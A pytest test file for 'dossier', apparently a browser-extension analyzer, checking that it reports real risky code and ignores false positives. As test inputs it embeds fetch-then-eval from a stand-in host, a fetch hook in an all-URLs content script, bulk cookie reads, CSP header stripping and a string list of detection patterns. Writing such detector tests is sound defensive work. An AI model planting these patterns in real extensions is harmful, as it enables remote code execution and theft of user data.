"""The core promise of the tool: real signal is reported, classic false positives are not."""
from dossier.pipeline import analyze

from .conftest import MV3_BASE

JQUERY_HEADER = "/*! jQuery v3.7.1 | (c) OpenJS Foundation and other contributors | jquery.org/license */\n"


def rules(res):
    return {f.rule for f in res.findings}


def hosts(res):
    return {e.host for e in res.endpoints}


def run(make_ext, manifest, files):
    return analyze(str(make_ext({**MV3_BASE, **manifest}, files)), log=lambda *_: None)


def test_bundled_library_eval_is_not_reported(make_ext):
    lib = JQUERY_HEADER + "function x(s){ return eval(s) } var f = new Function(a, b);"
    res = run(make_ext, {"background": {"service_worker": "bg.js"}}, {"bg.js": "console.log(1)", "lib/jquery.min.js": lib})
    assert "code.eval" not in rules(res)
    assert "code.new_function" not in rules(res)
    assert any(l.name == "jQuery" and l.version == "3.7.1" for l in res.libraries)
    assert res.noise.get("behaviour matches inside known third-party libraries", 0) >= 2


def test_first_party_dynamic_eval_is_reported(make_ext):
    src = "fetch('https://cfg.badcdn.example.net/x').then(r=>r.text()).then(t=>{ eval(t) })"
    res = run(make_ext, {"background": {"service_worker": "bg.js"}}, {"bg.js": src})
    assert "code.eval" in rules(res)
    assert "code.fetch_eval" in rules(res)


def test_benign_function_idioms_ignored(make_ext):
    src = 'var g = Function("return this")(); var h = new Function("return this")(); eval("require");'
    res = run(make_ext, {"background": {"service_worker": "bg.js"}}, {"bg.js": src})
    assert not rules(res) & {"code.eval", "code.new_function"}


def test_regex_literal_mentioning_function_is_ignored(make_ext):
    src = r"const isFn = t => /Function(?:Expression|Declaration)$/.test(t.type); fetch('/x');"
    res = run(make_ext, {"background": {"service_worker": "bg.js"}}, {"bg.js": src})
    assert "code.new_function" not in rules(res)


def test_code_text_inside_strings_is_ignored(make_ext):
    src = 'const filters = ["new Function(atob(", "eval(", "document.cookie"]; fetch("/a");'
    res = run(make_ext, {"background": {"service_worker": "bg.js"}}, {"bg.js": src})
    assert not rules(res) & {"code.eval", "code.new_function", "code.fetch_eval"}


def test_comment_urls_ips_and_crypto_addresses_are_not_endpoints(make_ext):
    src = (
        "/* see https://github.com/foo/bar/issues/1 and http://evil-in-comment.com/ */\n"
        "// licence: https://opensource.org/licenses/MIT\n"
        "const ns = 'http://www.w3.org/2000/svg';\n"
        "const ver = '10.2.3.4'; const btc = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';\n"
        "const local = 'http://192.168.1.1/admin'; const ph = 'https://example.com/x';\n"
        "const msg = 'Visit https://help.vendor-site.com/faq for help';\n"
        "fetch('https://api.real-endpoint.io/v1/collect', {method:'POST'});\n"
    )
    res = run(make_ext, {"background": {"service_worker": "bg.js"}}, {"bg.js": src})
    assert hosts(res) == {"api.real-endpoint.io"}
    ep = res.endpoints[0]
    assert ep.request_context and not ep.in_library_only


def test_trackers_classified(make_ext):
    src = ("const GA_ENDPOINT = 'https://www.google-analytics.com/mp/collect';\n"
           "fetch('https://o123.ingest.sentry.io/api/1/envelope/');\n"
           "const REC = 'https://script.hotjar.com/modules.js'; fetch(REC);\n")
    res = run(make_ext, {"background": {"service_worker": "bg.js"}}, {"bg.js": src})
    cats = {e.host: e.category for e in res.endpoints}
    assert cats["www.google-analytics.com"] == "analytics"
    assert cats["o123.ingest.sentry.io"] == "telemetry"
    assert "net.analytics" in rules(res)


def test_filter_list_data_files_do_not_produce_endpoints(make_ext):
    entries = ",".join(f'"https://ads{i}.adnet{i}.com/"' for i in range(60))
    res = run(make_ext, {"background": {"service_worker": "bg.js"}},
              {"bg.js": "1", "rulesets/list.js": f"self.list=[{entries}];"})
    assert not res.endpoints
    assert res.noise.get("URLs in bulk data files (filter lists, site databases)", 0) == 60


def test_minified_code_is_not_obfuscation(make_ext):
    minified = "!function(e){var t={};function n(r){if(t[r])return t[r].exports}" * 400
    res = run(make_ext, {"background": {"service_worker": "bg.js"}}, {"bg.js": minified})
    assert "code.obfuscated" not in rules(res)


def test_real_obfuscation_is_reported(make_ext):
    obf = "var " + ",".join(f"_0x{i:04x}=_0x{i + 1:04x}" for i in range(60)) + ";"
    res = run(make_ext, {"background": {"service_worker": "bg.js"}}, {"bg.js": obf})
    assert "code.obfuscated" in rules(res)


def test_page_network_hooking_detected_in_content_script(make_ext):
    src = "const o = window.fetch; window.fetch = async (...a) => { const r = await o(...a); return r };"
    res = run(make_ext, {"content_scripts": [{"matches": ["<all_urls>"], "js": ["cs.js"]}]}, {"cs.js": src})
    f = next(f for f in res.findings if f.rule == "data.hook_network")
    assert f.severity == "high" and f.confidence == "high"


def test_one_finding_per_behaviour(make_ext):
    src = "\n".join("chrome.cookies.getAll({}, x => x);" for _ in range(50))
    res = run(make_ext, {"background": {"service_worker": "bg.js"}, "permissions": ["cookies"]}, {"bg.js": src})
    cookie = [f for f in res.findings if f.rule == "data.cookies_api"]
    assert len(cookie) == 1 and cookie[0].total_hits == 50 and len(cookie[0].evidence) <= 5


def test_security_header_append_is_not_stripping(make_ext):
    rules_json = '[{"id":1,"action":{"type":"modifyHeaders","responseHeaders":[{"header":"content-security-policy","operation":"append","value":"x"}]}}]'
    res = run(make_ext, {}, {"r.json": rules_json})
    assert "net.strip_headers" not in rules(res)
    rules_json = rules_json.replace('"append","value":"x"', '"remove"')
    res = run(make_ext, {}, {"r.json": rules_json})
    assert "net.strip_headers" in rules(res)


def test_remote_script_in_extension_page(make_ext):
    res = run(make_ext, {"action": {"default_popup": "popup.html"}},
              {"popup.html": '<html><script src="https://cdn.someco.net/app.js"></script></html>'})
    assert "code.remote_script_tag" in rules(res)
